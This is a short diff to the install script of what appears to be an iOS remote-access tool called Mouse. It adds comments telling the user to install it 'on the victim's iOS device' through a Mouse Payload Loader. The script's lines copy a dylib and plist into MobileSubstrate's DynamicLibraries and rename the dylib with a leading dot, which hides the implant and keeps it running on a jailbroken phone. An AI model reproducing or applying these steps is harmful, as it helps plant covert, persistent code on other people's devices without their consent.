@@ -28,6 +28,9 @@
 #    Email     : entynetproject@gmail.com
 #
 
+# Install it using MPL on the victim's iOS device.
+# Do not install it without Mouse Payload Loader (MPL)
+
 cp mpl.dylib /Library/MobileSubstrate/DynamicLibraries
 cp mpl.plist /Library/MobileSubstrate/DynamicLibraries
 mv /Library/MobileSubstrate/DynamicLibraries/mpl.dylib /Library/MobileSubstrate/DynamicLibraries/.mpl.dylib
